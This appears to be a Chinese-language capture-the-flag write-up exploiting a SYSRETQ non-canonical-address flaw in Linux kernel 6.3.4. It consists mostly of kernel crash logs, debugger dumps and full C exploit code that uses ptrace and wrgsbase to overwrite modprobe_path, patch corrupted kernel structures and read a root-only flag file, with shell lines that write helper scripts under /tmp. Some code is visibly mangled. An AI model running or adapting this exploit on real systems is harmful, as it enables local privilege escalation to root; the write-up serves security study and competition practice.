[   10.018660] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   10.018662] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   10.018900] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   10.018902] RSP: 0018:
00000000deadbeef EFLAGS: 00010046
[   10.018937] RAX: 000000000000004e RBX: b3061c50e54d3600 RCX: 8000000000000000
[   10.018938] RDX: 00000000004bf0c0 RSI: 000000000040189d RDI: 0000000000000000
[   10.018939] RBP: 0000000000000000 R08: 0000000000008000 R09: 0000000000000001
[   10.018940] R10: 0000000000000001 R11: 0000000000000246 R12: 00000001002c307d
[   10.018941] R13: 0000000000000000 R14: 0000000000447a26 R15: 00007ffe8c607976
[   10.018942] FS:  0000000000402fcc(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   10.018944] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   10.018945] CR2: 00000000deadbed8 CR3: 0000000100a8c001 CR4: 0000000000770ef0
[   10.019027] PKRU: 55555554
[   10.019027] Call Trace:
[   10.019096] Modules linked in:
[   10.083849] ---[ end trace 0000000000000000 ]---
[   10.083854] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   10.083865] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   10.083867] RSP: 0018:
00000000deadbeef EFLAGS: 00010046
[   10.083869] RAX: 000000000000004e RBX: b3061c50e54d3600 RCX: 8000000000000000
[   10.083870] RDX: 00000000004bf0c0 RSI: 000000000040189d RDI: 0000000000000000
[   10.083871] RBP: 0000000000000000 R08: 0000000000008000 R09: 0000000000000001
[   10.083872] R10: 0000000000000001 R11: 0000000000000246 R12: 00000001002c307d
[   10.083921] R13: 0000000000000000 R14: 0000000000447a26 R15: 00007ffe8c607976
[   10.083934] FS:  0000000000402fcc(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   10.083935] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   10.083936] CR2: 00000000deadbed8 CR3: 0000000100a8c001 CR4: 0000000000770ef0
[   10.084008] PKRU: 55555554
[   10.084009] Kernel panic - not syncing: Fatal exception in interrupt
[   10.084920] Kernel Offset: disabled
int main() {

        char RSP[0x3000] = { 0 };

        struct user_regs_struct regs;
        printf("%#pn", RSP);
        do_sysret(RSP + 0x1000, &regs);
        sleep(1);

        puts("[+] EXP NEVER END");
        return 0;
}
0x7ffe97c51690
[   11.949086] traps: PANIC: double fault, error_code: 0x0
[   11.949132] double fault: 0000 [#1] PREEMPT SMP NOPTI
[   11.949160] CPU: 0 PID: 77 Comm: poc Not tainted 6.3.4 #14
[   11.949163] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   11.949164] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   11.949350] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   11.949351] RSP: 0018:
00007ffe97c52690 EFLAGS: 00010046
......
(remote) gef➤  x/30gi asm_exc_general_protection
   0xffffffff81a00a90 <asm_exc_general_protection>:     clac
   0xffffffff81a00a93 <asm_exc_general_protection+3>:   cld
   0xffffffff81a00a94 <asm_exc_general_protection+4>:   call   0xffffffff81a011c0 <error_entry>
   0xffffffff81a00a99 <asm_exc_general_protection+9>:   mov    rsp,rax
   0xffffffff81a00a9f <asm_exc_general_protection+12>:  mov    rdi,rsp
   0xffffffff81a00a9f <asm_exc_general_protection+15>:  mov    rsi,QWORD PTR [rsp+0x78]
   0xffffffff81a00aa4 <asm_exc_general_protection+20>:  mov    QWORD PTR [rsp+0x78],0xffffffffffffffff
   0xffffffff81a00aad <asm_exc_general_protection+29>:  call   0xffffffff817f2430 <exc_general_protection>
   0xffffffff81a00ab2 <asm_exc_general_protection+34>:  jmp    0xffffffff81a01300 <error_return>
   0xffffffff81a00ab7 <asm_exc_general_protection+39>:  nop    WORD PTR [rax+rax*1+0x0]
......
(remote) gef➤  x/60gi error_entry
   0xffffffff81a011c0 <error_entry>:    push   rsi
   0xffffffff81a011c1 <error_entry+1>:  mov    rsi,QWORD PTR [rsp+0x8]
   0xffffffff81a011c6 <error_entry+6>:  mov    QWORD PTR [rsp+0x8],rdi
   /* push regs */
   0xffffffff81a011cb <error_entry+11>: push   rdx
   0xffffffff81a011cc <error_entry+12>: push   rcx
   0xffffffff81a011cd <error_entry+13>: push   rax
   0xffffffff81a011ce <error_entry+14>: push   r8
   0xffffffff81a011d0 <error_entry+16>: push   r9
   0xffffffff81a011d2 <error_entry+18>: push   r10
   0xffffffff81a011d4 <error_entry+20>: push   r11
   0xffffffff81a011d6 <error_entry+22>: push   rbx
   0xffffffff81a011d7 <error_entry+23>: push   rbp
   0xffffffff81a011d8 <error_entry+24>: push   r12
   0xffffffff81a011da <error_entry+26>: push   r13
   0xffffffff81a011dc <error_entry+28>: push   r14
   0xffffffff81a011de <error_entry+30>: push   r15
   0xffffffff81a011e0 <error_entry+32>: push   rsi
   /* clear regs */
   0xffffffff81a011e1 <error_entry+33>: xor    esi,esi
   0xffffffff81a011e3 <error_entry+35>: xor    edx,edx
   0xffffffff81a011e5 <error_entry+37>: xor    ecx,ecx
   0xffffffff81a011e7 <error_entry+39>: xor    r8d,r8d
   0xffffffff81a011ea <error_entry+42>: xor    r9d,r9d
   0xffffffff81a011ed <error_entry+45>: xor    r10d,r10d
   0xffffffff81a011f0 <error_entry+48>: xor    r11d,r11d
   0xffffffff81a011f3 <error_entry+51>: xor    ebx,ebx
   0xffffffff81a011f5 <error_entry+53>: xor    ebp,ebp
   0xffffffff81a011f7 <error_entry+55>: xor    r12d,r12d
   0xffffffff81a011fa <error_entry+58>: xor    r13d,r13d
   0xffffffff81a011fd <error_entry+61>: xor    r14d,r14d
   0xffffffff81a01200 <error_entry+64>: xor    r15d,r15d
   /* check cs.cpl*/
   0xffffffff81a01203 <error_entry+67>: test   BYTE PTR [rsp+0x90],0x3
   0xffffffff81a0120b <error_entry+75>: je     0xffffffff81a0125c <error_entry+156>
   0xffffffff81a0120d <error_entry+77>: swapgs
......
......
 swapgs /* 切换 gs 为用户态 gs */
 sysretq /* sysretq 返回 */
(remote) gef➤  x/60gi exc_general_protection
   0xffffffff817f2430 <exc_general_protection>:            push   r13
   0xffffffff817f2432 <exc_general_protection+2>:       mov    r13,rsi
   0xffffffff817f2435 <exc_general_protection+5>:       push   r12
   0xffffffff817f2437 <exc_general_protection+7>:       push   rbp
   0xffffffff817f2438 <exc_general_protection+8>:       mov    rbp,rdi
   0xffffffff817f243b <exc_general_protection+11>:      push   rbx
   0xffffffff817f243c <exc_general_protection+12>:      sub    rsp,0x70
   0xffffffff817f2440 <exc_general_protection+16>:      mov    rax,QWORD PTR gs:
0x28 <=== double fault
......
void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
    struct user_regs_struct regs;
......

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }

        asm volatile("wrgsbase %0" : : "r" (gsbase)); // <==== 修改 user gsbase

        raise(SIGSTOP);
        fork();
        return 0;
    }

......
}
ctf@corctf:~$ ./poc
[+] do_sysret
[    8.589102] general protection fault, maybe for address 0x4e: 0000 [#1] PREEMPT SMP NOPTI
......
[+] EXP NEVER END
[    9.593334] BUG: kernel NULL pointer dereference, address: 0000000000000253
[    9.598734] #PF: supervisor read access in kernel mode
[    9.601579] #PF: error_code(0x0000) - not-present page
......
    #include <stdio.h>
    #include 
    #include <string.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include <assert.h>
    #include <errno.h>
    #include <fcntl.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <sys/user.h>
    #include <sys/types.h>
    #include <sys/ptrace.h>
    #include <sys/syscall.h>

uint64_t gsbase = 0xffff88813bc00000;
uint64_t modprobe_path = 0xffffffff8203b840;

void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
 ......
}

void pre_get_flag(){
        system("echo -ne '#!/bin/shn/bin/chmod 777 /root/flag.txt' > /tmp/x");
        system("chmod +x /tmp/x");
        system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy");
        system("chmod +x /tmp/dummy");
}

void get_flag() {
        system("/tmp/dummy");
        system("cat /root/flag.txt");
}

int main() {

        struct user_regs_struct regs;

        pre_get_flag();

        char str[8] = "/tmp/xx00x00";
        for (int i = 0; i < sizeof(regs) / 8; i++) {
                ((uint64_t*)&regs)[i] = *((uint64_t*)str);
        }

        puts("n[+] do_sysret");
        getchar();
        do_sysret(modprobe_path + 0x78, &regs);
        sleep(1);

        puts("n[+] get_flag");
      getchar();
        get_flag();
        sleep(1);
        puts("[+] EXP NEVER END");
        return 0;
}
(remote) gef➤  x/s 0xffffffff8203b840
0xffffffff8203b840:     "/sbin/modprobe"
gef➤  x/s 0xffffffff8203b840
0xffffffff8203b840:     "/tmp/x"
[+] get_flag
[   23.158576] BUG: kernel NULL pointer dereference, address: 00000000000001e0
[   23.165033] #PF: supervisor read access in kernel mode
[   23.175756] #PF: error_code(0x0000) - not-present page
[   23.178612] PGD 10115a067 P4D 10115a067 PUD 101153067 PMD 0
[   23.183171] Oops: 0000 [#2] PREEMPT SMP NOPTI
[   23.186155] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
[   23.191255] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   23.197747] Workqueue: events_unbound call_usermodehelper_exec_work
[   23.202854] RIP: 0010:
inc_rlimit_ucounts+0x31/0x70
[   23.206428] Code: f0 48 89 f9 45 31 d2 49 b9 ff ff ff ff ff ff ff 7f 4a 8d 34 c5 70 00 00 00 49 83 c0 46 eb 1c 48 39 cf 4c 0f 44 d0 48 8b 41 10 <48> 8b 88 e0 01 00 00 4e 8b 4c c8
[   23.226013] RSP: 0018:
ffffc900000e3cb8 EFLAGS: 00010246
[   23.229254] RAX: 0000000000000000 RBX: ffff888101038000 RCX: ffffffff8203b6c0
[   23.233876] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
[   23.243660] RBP: ffffffff8203b6c0 R08: 0000000000000046 R09: 7fffffffffffffff
[   23.251135] R10: 0000000000000001 R11: 0000000000000025 R12: 0000000000000000
[   23.255452] R13: ffffc900000e3df0 R14: 00000000ffffffff R15: 0000000000800100
[   23.260494] FS:  0000000000000000(0000) GS:
ffff88813bc00000(0000) knlGS:
0000000000000000
[   23.268356] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   23.272230] CR2: 00000000000001e0 CR3: 0000000100a8c006 CR4: 0000000000770ef0
......
(remote) gef➤  gef-remox/40gi inc_rlimit_ucounts
   0xffffffff8109e980 :    test   rdi,rdi
   0xffffffff8109e983 :   je     0xffffffff8109e9e1 
   0xffffffff8109e985 :   mov    r8d,esi
   0xffffffff8109e988 :   mov    rcx,rdi
   0xffffffff8109e98b :  xor    r10d,r10d
   0xffffffff8109e98e :  movabs r9,0x7fffffffffffffff
   0xffffffff8109e998 :  lea    rsi,[r8*8+0x70]
   0xffffffff8109e9a0 :  add    r8,0x46
   0xffffffff8109e9a4 :  jmp    0xffffffff8109e9c2 
   0xffffffff8109e9a6 :  cmp    rdi,rcx
   0xffffffff8109e9a9 :  cmove  r10,rax
   0xffffffff8109e9ad :  mov    rax,QWORD PTR [rcx+0x10]
   0xffffffff8109e9b1 :  mov    rcx,QWORD PTR [rax+0x1e0] <==== PAGE FAULT
......
$rax   : 0x0
......
   0xffffffff8109e9a6  cmp    rdi, rcx
   0xffffffff8109e9a9  cmove  r10, rax
   0xffffffff8109e9ad  mov    rax, QWORD PTR [rcx+0x10]
●→ 0xffffffff8109e9b1  mov    rcx, QWORD PTR [rax+0x1e0]
   0xffffffff8109e9b8  mov    r9, QWORD PTR [rax+r8*8+0x8
0xffffffff8109e9ad  mov    rax, QWORD PTR [rcx+0x10]
(remote) gef➤  x/16gx $rcx
0xffffffff8203b6c0:     0xffffffff8203b740      0xffffffff8203b808
0xffffffff8203b6d0:     0x0000000000000000 <== rcx+0x10      0x0000000100000000
0xffffffff8203b6e0:     0x0000000000000000      0xffffffff810c50b3
0xffffffff8203b6f0:     0xffffffff00000018      0xffffffff8203b750
0xffffffff8203b700:     0xffffffff8203b710      0xe1e1c00db29d7d00
0xffffffff8203b710:     0x0000000080050033      0xffffffff81e99724
0xffffffff8203b720:     0x0000000055555554      0x0000000000000000
0xffffffff8203b730:     0x0000000000000001      0xffffffff8203b5c0
(remote) gef➤  gef-remox/16gx $rcx
0xffffffff8203b6c0:     0xffff888100049600      0xffffffff82640160
0xffffffff8203b6d0:     0xffffffff8203a320      0x0000002e00000000
0xffffffff8203b6e0:     0x0000000000000000      0x0000000000000000
0xffffffff8203b6f0:     0x0000000000000000      0x0000000000000000
0xffffffff8203b700:     0x0000000000000000      0x0000000000000000
0xffffffff8203b710:     0x0000000000000000      0x0000000000000000
0xffffffff8203b720:     0x0000000000000000      0x0000000000000000
0xffffffff8203b730:     0x0000000000000029      0x0000000000000000
......
  puts("n[+] do_sysret to fix up");
        for (int i = 0; i < sizeof(regs) / 8; i++) {
                ((uint64_t*)&regs)[i] = 0xAAAAAAAA + i;
        }
        do_sysret(fix_up + 0xa0, &regs);
        sleep(1);
......
$rax   : 0xaaaaaaad
......
   0xffffffff8109e9a6   cmp    rdi, rcx
   0xffffffff8109e9a9   cmove   r10, rax
   0xffffffff8109e9ad   mov    rax, QWORD PTR [rcx+0x10]
●→ 0xffffffff8109e9b1  mov    rcx, QWORD PTR [rax+0x1e0]
......
(remote) gef➤  x/16gx $rcx
0xffffffff8203b6c0:     0x00000000aaaaaaab      0x00000000aaaaaaac
0xffffffff8203b6d0:     0x00000000aaaaaaad      0x00000001aaaaaaae
0xffffffff8203b6e0:     0x00000000aaaaaaaf      0x0000000000000246
0xffffffff8203b6f0:     0x00000000aaaaaab1      0x00000000aaaaaab2
0xffffffff8203b700:     0x00000000aaaaaab3      0x0000000000000053
0xffffffff8203b710:     0x8000000000000000      0x00000000aaaaaab6
0xffffffff8203b720:     0x00000000aaaaaab7      0x00000000aaaaaab8
0xffffffff8203b730:     0x0000000000000000      0xffffffff81a00191
    #include <stdio.h>
    #include 
    #include <string.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include <assert.h>
    #include <errno.h>
    #include <fcntl.h>
    #include <sys/wait.h>
    #include <sys/mman.h>
    #include <sys/user.h>
    #include <sys/types.h>
    #include <sys/ptrace.h>
    #include <sys/syscall.h>

uint64_t kbase = 0xffffffff81000000;
uint64_t phy_base = 0xffff888000000000;
uint64_t gsbase = 0x13bc00000;
uint64_t modprobe_path = 0x103b840;
uint64_t fix_up = 0x103b6c0;

void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
    struct user_regs_struct regs;
    int status;
    pid_t chld;

    memcpy(&regs, regs_arg, sizeof(regs));

    if ((chld = fork()) < 0) {
        perror("fork");
        exit(1);
    }

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }

        asm volatile("wrgsbase %0" : : "r" (gsbase));

        raise(SIGSTOP);
        fork();
        return 0;
    }

    waitpid(chld, &status, 0);

    ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK);
    ptrace(PTRACE_CONT, chld, 0, 0);

    waitpid(chld, &status, 0);

    regs.rip = 0x8000000000000000; // not-canonical
    regs.rcx = 0x8000000000000000; // not-canonical
    regs.rsp = addr;

    // necessary stuff
    regs.eflags = 0x246;
    regs.r11 = 0x246;
    regs.ss = 0x2b;
    regs.cs = 0x33;

    // just needs to be bad (> TASK_MAX) so the value set by wrgsbase isn't overwritten
    regs.gs_base = -1;

    ptrace(PTRACE_SETREGS, chld, NULL, &regs);
    ptrace(PTRACE_CONT, chld, 0, 0);
    ptrace(PTRACE_DETACH, chld, 0, 0);
}

void pre_get_flag(){
        system("echo -ne '#!/bin/shncp /root/flag.txt /tmp/flag.txtnchown ctf:
ctf /tmp;
        system("chmod +x /tmp/x");
        system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy");
        system("chmod +x /tmp/dummy");
}

void get_flag() {
        system("/tmp/dummy");
        system("cat /tmp/flag.txt");
        exit(0);
}

int main() {

        struct user_regs_struct regs;

        pre_get_flag();

        gsbase += phy_base;
        modprobe_path += kbase;
        fix_up += kbase;

        char str[8] = "/tmp/xx00x00";
        for (int i = 0; i < sizeof(regs) / 8; i++) {
                ((uint64_t*)&regs)[i] = *((uint64_t*)str);
        }

        puts("n[+] do_sysret to change modprobe_path");
//      getchar();
        do_sysret(modprobe_path + 0x78, &regs);
        sleep(1);

        puts("n[+] do_sysret to fix up");
        for (int i = 0; i < sizeof(regs) / 8; i++) {
                ((uint64_t*)&regs)[i] = 0;
        }

        ((uint64_t*)&regs)[1] = phy_base + 0x100049600;
        ((uint64_t*)&regs)[2] = kbase + 0x1640160;
        ((uint64_t*)&regs)[3] = kbase + 0x103a320;
        ((uint64_t*)&regs)[4] = 0x0000002e00000000;

        do_sysret(fix_up + 0xa0, &regs);
        sleep(1);

        puts("n[+] get_flag");
//      getchar();
        get_flag();
        sleep(1);
        puts("[+] EXP NEVER END");
        return 0;
}
ctf@corctf:~$ ./poc

[+] do_sysret to change modprobe_path
[   54.860622] general protection fault, maybe for address 0x52: 0000 [#1] PREEMPT SMP NOPTI
[   54.863942] CPU: 0 PID: 81 Comm: poc Not tainted 6.3.4 #14
[   54.866204] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   54.869854] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   54.875756] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   54.897567] RSP: 0018:
ffffffff8203b8b8 EFLAGS: 00010046
[   54.900951] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
[   54.908092] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
[   54.912087] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
[   54.916936] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
[   54.923207] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
[   54.928403] FS:  0000782f706d742f(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   54.934439] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   54.941481] CR2: 0000000000c72840 CR3: 0000000100acc003 CR4: 0000000000770ef0
[   54.946718] PKRU: 55555554
[   54.948308] Call Trace:
[   54.950252] Modules linked in:
[   54.952905] ---[ end trace 0000000000000000 ]---
[   54.956570] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   54.959973] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   54.975296] RSP: 0018:
ffffffff8203b8b8 EFLAGS: 00010046
[   54.979096] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
[   54.983603] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
[   54.990378] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
[   54.996204] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
[   55.000951] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
[   55.006682] FS:  0000782f706d742f(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   55.012856] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   55.015931] CR2: 0000000000c72840 CR3: 0000000100acc003 CR4: 0000000000770ef0
[   55.022360] PKRU: 55555554
[   55.024861] note: poc[81] exited with irqs disabled

[+] do_sysret to fix up
[   55.870690] general protection fault
[   55.873686] general protection fault, maybe for address 0x54: 0000 [#2] PREEMPT SMP NOPTI
[   55.881308] CPU: 0 PID: 83 Comm: poc Tainted: G      D            6.3.4 #14
[   55.883938] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   55.889846] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   55.894069] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   55.911307] RSP: 0018:
ffffffff8203b760 EFLAGS: 00010046
[   55.915745] RAX: 0000000000000054 RBX: 0000000000000000 RCX: 8000000000000000
[   55.922827] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
[   55.927877] RBP: 0000002e00000000 R08: 0000000000000000 R09: 0000000000000000
[   55.934469] R10: 0000000000000000 R11: 0000000000000246 R12: ffffffff8203a320
[   55.939055] R13: ffffffff82640160 R14: ffff888100049600 R15: 0000000000000000
[   55.944725] FS:  0000000000000000(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   55.950507] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   55.953619] CR2: 0000000000c72840 CR3: 0000000100acc006 CR4: 0000000000770ef0
[   55.957433] PKRU: 55555554
[   55.958668] Call Trace:
[   55.960963] Modules linked in:
[   55.964387] ---[ end trace 0000000000000000 ]---
[   55.968013] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   55.971660] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   55.986549] RSP: 0018:
ffffffff8203b8b8 EFLAGS: 00010046
[   55.991037] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
[   55.995083] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
[   56.001529] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
[   56.006144] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
[   56.012928] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
[   56.019846] FS:  0000000000000000(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   56.025685] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   56.031767] CR2: 0000000000c72840 CR3: 0000000100acc006 CR4: 0000000000770ef0
[   56.039399] PKRU: 55555554
[   56.041014] note: poc[83] exited with irqs disabled

[+] get_flag
[   56.889309] ------------[ cut here ]------------
[   56.894489] WARNING: CPU: 0 PID: 27 at kernel/ucount.c:
285 dec_rlimit_ucounts+0x4f/0x60
[   56.905581] Modules linked in:
[   56.908304] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
[   56.915819] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   56.920894] Workqueue: events_unbound call_usermodehelper_exec_work
[   56.925990] RIP: 0010:
dec_rlimit_ucounts+0x4f/0x60
[   56.931058] Code: c1 04 31 48 29 d0 78 22 48 39 cf 4c 0f 44 c0 48 8b 41 10 48 8b 88 e0 01 00 00 48 85 c9 75 db 4d 85 c0 0f 94 c0 c3 cc cc cc cc <0f> 0b eb da 31 c0 c3 cc cc cc c0
[   56.948338] RSP: 0018:
ffffc900000e3d00 EFLAGS: 00010297
[   56.951704] RAX: ffffffffffffffff RBX: ffffc900000e3e08 RCX: ffffffff8203b6c0
[   56.957035] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
[   56.961815] RBP: ffff88810103c140 R08: ffffffffffffffff R09: ffffffffffffffff
[   56.968173] R10: 00000000000000bb R11: 00000000000009e9 R12: ffffffff8203b6c0
[   56.972953] R13: 0000000000000010 R14: dead000000000122 R15: 0000000000000000
[   56.979591] FS:  0000000000000000(0000) GS:
ffff88813bc00000(0000) knlGS:
0000000000000000
[   56.987164] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   56.991283] CR2: 000000000065eff0 CR3: 000000000202c006 CR4: 0000000000770ef0
[   56.998861] PKRU: 55555554
[   57.002433] Call Trace:
[   57.005565]  <TASK>
[   57.007367]  release_task+0x47/0x4b0
[   57.011674]  ? thread_group_cputime_adjusted+0x46/0x70
[   57.017727]  wait_consider_task+0x90d/0x9e0
[   57.020530]  do_wait+0x17b/0x2c0
[   57.022370]  kernel_wait+0x44/0x90
[   57.024532]  ? __pfx_child_wait_callback+0x10/0x10
[   57.027662]  call_usermodehelper_exec_work+0x72/0x80
[   57.033738]  process_one_work+0x1b1/0x340
[   57.037279]  worker_thread+0x45/0x3b0
[   57.039978]  ? __pfx_worker_thread+0x10/0x10
[   57.043033]  kthread+0xd1/0x100
[   57.046609]  ? __pfx_kthread+0x10/0x10
[   57.050986]  ret_from_fork+0x29/0x50
[   57.054256]  </TASK>
[   57.055543] ---[ end trace 0000000000000000 ]---
/tmp/dummy: line 1: ����: not found
corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs ma}
[   57.084675] poc (76) used greatest stack depth: 13768 bytes left
ctf@corctf:~$ cat /tmp/flag.txt
corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs ma}
ctf@corctf:~$
四
调试技巧
(remote) gef➤  c
Continuing.
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x401d05

Command aborted.
int main() {

        char RSP[0x3000] = { 0 };

        struct user_regs_struct regs;
        printf("%#pn", RSP);
        printf("%#pn", do_sysret); // <=== 打印预下断点位置的地址
        getchar();     // stop stop
        do_sysret(RSP + 0x1000, &regs);
        sleep(1);

        puts("[+] EXP NEVER END");
        return 0;
}
五
总结
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/6-1709808522.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/0-1709808523.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/1-1709808524.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/5-1709808525.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/0-1709808526.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/5-1709808527.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/7-1709808527.gif)